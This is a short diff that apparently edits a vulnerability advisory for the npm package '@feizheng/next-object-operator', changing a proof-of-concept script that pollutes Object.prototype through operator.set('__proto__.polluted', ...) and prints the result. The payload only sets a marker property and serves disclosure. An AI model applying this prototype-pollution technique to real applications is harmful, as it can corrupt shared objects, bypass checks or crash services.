@@ -11,7 +11,8 @@ This package fails to restrict access to prototypes of objects, allowing for mod
 ```
 // poc.js
 var nextObjectOperator = require("@feizheng/next-object-operator")
-const operator = new nextObjectOperator({});
+const data = {};
+const operator = new nextObjectOperator(data);
 console.log("Before : " + {}.polluted);
 operator.set('__proto__.polluted', 'Yes! Its Polluted');
 console.log("After : " + {}.polluted);
